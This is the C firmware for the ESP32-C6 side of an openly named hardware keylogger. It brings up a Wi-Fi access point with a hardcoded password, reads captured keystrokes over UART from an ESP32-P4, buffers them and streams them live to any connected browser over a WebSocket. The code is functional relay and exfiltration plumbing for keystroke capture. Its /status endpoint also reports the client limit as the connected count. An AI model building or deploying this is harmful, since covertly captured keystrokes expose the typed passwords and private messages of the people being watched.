// ESP32-C6 firmware for the keylogger web UI.
//
// - Hosts Wi-Fi soft AP "P4-KeyLogger" / "changeme123"
// - Serves the web UI at http://192.168.4.1
// - WebSocket at /ws streams incoming keystrokes to browsers
// - UART1 on GPIO4 (RX) reads a plain-text stream of decoded keystrokes
//   coming from the ESP32-P4 (P4 sends via UART TX on GPIO37).
//   NO wiring assumption: if the P4 doesn't send anything, the web UI simply
//   shows nothing new — the C6 firmware never crashes.
//
// This is intentionally standalone. The C6 has its own Wi-Fi and doesn't
// need esp-hosted-mcu.  P4 firmware is untouched by default.

#include <string.h>
#include "esp_log.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_http_server.h"
#include "nvs_flash.h"
#include "driver/uart.h"
#include "driver/gpio.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "freertos/ringbuf.h"

static const char *TAG = "c6ui";

// ------------------------------- config -------------------------------
#define AP_SSID     "P4-KeyLogger"
#define AP_PASS     "changeme123"
#define AP_CHANNEL  6
#define AP_MAX_STA  4

#define P4_UART_NUM UART_NUM_1
#define P4_UART_RX  GPIO_NUM_4
#define P4_UART_BAUD 115200

#define MAX_WS_CLIENTS 4
#define KEYS_RING_BYTES 16384

// ------------------------------- state --------------------------------
extern const char WEB_UI_HTML[];
extern const int  WEB_UI_HTML_LEN;

static httpd_handle_t s_http;
static int s_ws_fds[MAX_WS_CLIENTS];
static SemaphoreHandle_t s_ws_lock;
static RingbufHandle_t   s_keys_ring;    // recent keys, for late clients

// ------------------------- WebSocket bookkeeping ---------------------
static void ws_add(int fd) {
    xSemaphoreTake(s_ws_lock, portMAX_DELAY);
    for (int i = 0; i < MAX_WS_CLIENTS; i++) if (s_ws_fds[i] == 0) { s_ws_fds[i] = fd; break; }
    xSemaphoreGive(s_ws_lock);
}
static void ws_drop(int fd) {
    xSemaphoreTake(s_ws_lock, portMAX_DELAY);
    for (int i = 0; i < MAX_WS_CLIENTS; i++) if (s_ws_fds[i] == fd) s_ws_fds[i] = 0;
    xSemaphoreGive(s_ws_lock);
}
static void ws_broadcast(const char *data, size_t len) {
    if (!s_http || !s_ws_lock || !len) return;
    httpd_ws_frame_t f = {
        .final = true, .fragmented = false, .type = HTTPD_WS_TYPE_TEXT,
        .payload = (uint8_t *)data, .len = len,
    };
    int fds[MAX_WS_CLIENTS];
    xSemaphoreTake(s_ws_lock, portMAX_DELAY);
    memcpy(fds, s_ws_fds, sizeof(fds));
    xSemaphoreGive(s_ws_lock);
    for (int i = 0; i < MAX_WS_CLIENTS; i++) {
        if (fds[i] == 0) continue;
        if (httpd_ws_send_frame_async(s_http, fds[i], &f) != ESP_OK) ws_drop(fds[i]);
    }
}

// ------------------------- HTTP handlers -----------------------------
static esp_err_t h_root(httpd_req_t *r) {
    httpd_resp_set_type(r, "text/html; charset=utf-8");
    httpd_resp_set_hdr(r, "Cache-Control", "no-store");
    return httpd_resp_send(r, WEB_UI_HTML, WEB_UI_HTML_LEN);
}

static esp_err_t h_ws(httpd_req_t *r) {
    if (r->method == HTTP_GET) {
        int fd = httpd_req_to_sockfd(r);
        ws_add(fd);
        ESP_LOGI(TAG, "ws client fd=%d", fd);
        // Backfill: send whatever recent bytes are in the ring
        size_t item_sz = 0;
        char *item = (char *)xRingbufferReceiveUpTo(s_keys_ring, &item_sz, 0, 2048);
        if (item && item_sz) {
            httpd_ws_frame_t f = { .final=true, .type=HTTPD_WS_TYPE_TEXT,
                                   .payload=(uint8_t*)item, .len=item_sz };
            httpd_ws_send_frame_async(r->handle, fd, &f);
        }
        if (item) vRingbufferReturnItem(s_keys_ring, item);
        return ESP_OK;
    }
    // Ignore inbound frames but drain them so the socket stays alive
    httpd_ws_frame_t f = { 0 };
    uint8_t buf[128];
    f.payload = buf;
    if (httpd_ws_recv_frame(r, &f, sizeof(buf)) != ESP_OK) ws_drop(httpd_req_to_sockfd(r));
    return ESP_OK;
}

static esp_err_t h_status(httpd_req_t *r) {
    char body[96];
    int n = snprintf(body, sizeof(body),
                     "{\"chip\":\"esp32c6\",\"ssid\":\"%s\",\"connected_ws\":%d}",
                     AP_SSID, MAX_WS_CLIENTS);
    httpd_resp_set_type(r, "application/json");
    return httpd_resp_send(r, body, n);
}

// ------------------------- Wi-Fi AP + HTTP ----------------------------
static void wifi_event(void *arg, esp_event_base_t base, int32_t id, void *data) {
    (void)arg; (void)data;
    if (base == WIFI_EVENT && id == WIFI_EVENT_AP_STACONNECTED)    ESP_LOGI(TAG, "STA connected");
    else if (base == WIFI_EVENT && id == WIFI_EVENT_AP_STADISCONNECTED) ESP_LOGI(TAG, "STA disconnected");
}

static esp_err_t wifi_ap_up(void) {
    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        nvs_flash_erase();
        err = nvs_flash_init();
    }
    if (err != ESP_OK) return err;

    esp_netif_init();
    esp_event_loop_create_default();
    esp_netif_create_default_wifi_ap();

    wifi_init_config_t init = WIFI_INIT_CONFIG_DEFAULT();
    if ((err = esp_wifi_init(&init)) != ESP_OK) return err;
    esp_event_handler_instance_register(WIFI_EVENT, ESP_EVENT_ANY_ID, wifi_event, NULL, NULL);

    wifi_config_t ap = { 0 };
    strncpy((char *)ap.ap.ssid, AP_SSID, sizeof(ap.ap.ssid) - 1);
    ap.ap.ssid_len = strlen(AP_SSID);
    strncpy((char *)ap.ap.password, AP_PASS, sizeof(ap.ap.password) - 1);
    ap.ap.channel = AP_CHANNEL;
    ap.ap.max_connection = AP_MAX_STA;
    ap.ap.authmode = WIFI_AUTH_WPA2_PSK;

    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &ap);
    esp_wifi_start();
    ESP_LOGI(TAG, "AP \"%s\" up on channel %d", AP_SSID, AP_CHANNEL);
    return ESP_OK;
}

static esp_err_t http_up(void) {
    httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();
    cfg.max_uri_handlers = 8;
    cfg.recv_wait_timeout = 5;
    cfg.send_wait_timeout = 5;
    if (httpd_start(&s_http, &cfg) != ESP_OK) return ESP_FAIL;
    httpd_uri_t routes[] = {
        {"/",        HTTP_GET, h_root,   NULL, false, false, NULL},
        {"/ws",      HTTP_GET, h_ws,     NULL, true,  false, NULL},
        {"/status",  HTTP_GET, h_status, NULL, false, false, NULL},
    };
    for (unsigned i = 0; i < sizeof(routes)/sizeof(routes[0]); i++)
        httpd_register_uri_handler(s_http, &routes[i]);
    ESP_LOGI(TAG, "HTTP up on port 80");
    return ESP_OK;
}

// ------------------------- UART reader (P4 → C6) ----------------------
// The P4 firmware can optionally push a text stream of keystrokes to us.
// If it never sends anything, we don't care — the web UI still works.
static void uart_task(void *arg) {
    (void)arg;
    uart_config_t cfg = {
        .baud_rate = P4_UART_BAUD,
        .data_bits = UART_DATA_8_BITS,
        .parity    = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
        .source_clk = UART_SCLK_DEFAULT,
    };
    uart_driver_install(P4_UART_NUM, 2048, 0, 0, NULL, 0);
    uart_param_config(P4_UART_NUM, &cfg);
    uart_set_pin(P4_UART_NUM, UART_PIN_NO_CHANGE, P4_UART_RX,
                 UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE);

    char buf[256];
    while (1) {
        int n = uart_read_bytes(P4_UART_NUM, buf, sizeof(buf), pdMS_TO_TICKS(50));
        if (n > 0) {
            // Push to ring buffer for late-connecting clients + broadcast
            xRingbufferSend(s_keys_ring, buf, n, 0);
            ws_broadcast(buf, n);
        }
    }
}

// ------------------------- app entry ---------------------------------
void app_main(void) {
    ESP_LOGI(TAG, "ESP32-C6 KeyLogger web UI starting");
    s_ws_lock = xSemaphoreCreateMutex();
    s_keys_ring = xRingbufferCreate(KEYS_RING_BYTES, RINGBUF_TYPE_BYTEBUF);

    // Bring up Wi-Fi first; if it fails we log and keep going (still useful
    // to have HTTP up on a static AP once someone reboots).
    if (wifi_ap_up() != ESP_OK) ESP_LOGE(TAG, "Wi-Fi AP failed");
    if (http_up() != ESP_OK)   ESP_LOGE(TAG, "HTTP server failed");

    xTaskCreate(uart_task, "uart_rx", 4096, NULL, 5, NULL);

    ESP_LOGI(TAG, "Connect to \"%s\" with password \"%s\", browse to http://192.168.4.1",
             AP_SSID, AP_PASS);
    // Idle forever; workers run on their own tasks.
    while (1) vTaskDelay(pdMS_TO_TICKS(5000));
}
